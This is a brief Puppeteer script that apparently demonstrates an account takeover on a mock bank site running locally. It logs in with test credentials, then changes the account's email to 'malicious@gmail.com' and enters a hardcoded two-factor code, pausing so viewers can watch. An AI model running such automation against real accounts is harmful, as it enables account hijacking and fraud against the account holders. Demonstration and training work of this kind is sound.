const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null
  });

  const page = await browser.newPage();
  await page.goto('http://virtualbank.com:3000/', {waitUntil: 'load'});

  // Fill out the form using data from fake site
  await page.waitForSelector('input#id');
  await page.focus('input#id');
  await page.type('input#id', 'test');
  await page.waitForTimeout(3000);

  await page.focus('input#password');
  await page.type('input#password', 'test');
  await page.evaluate( () => {
    window.scrollBy(0, window.innerHeight);
  });
  await page.waitForTimeout(3000);

  await page.focus('input#sbmbtn');
  await page.click('input#sbmbtn')
  await page.waitForTimeout(3000);

  // Pause so people can see the filled out fields
  await page.waitForTimeout(3000);

  await page.focus('a#settingslnk');
  await page.click('a#settingslnk')
  await page.waitForTimeout(3000);

  await page.evaluate( () => document.getElementById("email").value = "")
  await page.focus('input#email');
  await page.type('input#email', 'malicious@gmail.com');
  await page.waitForTimeout(3000);

  await page.focus('input#tfa');
  await page.type('input#tfa', '892349');
  await page.waitForTimeout(3000);
  await page.evaluate( () => {
    window.scrollBy(0, window.innerHeight);
  });
  await page.waitForTimeout(3000);

  await page.focus('input#sbmbtn');
  await page.click('input#sbmbtn')
  await page.waitForTimeout(3000);

  await page.focus('a#accountlnk');
  await page.click('a#accountlnk')
  await page.waitForTimeout(3000);

  await browser.close();
})();
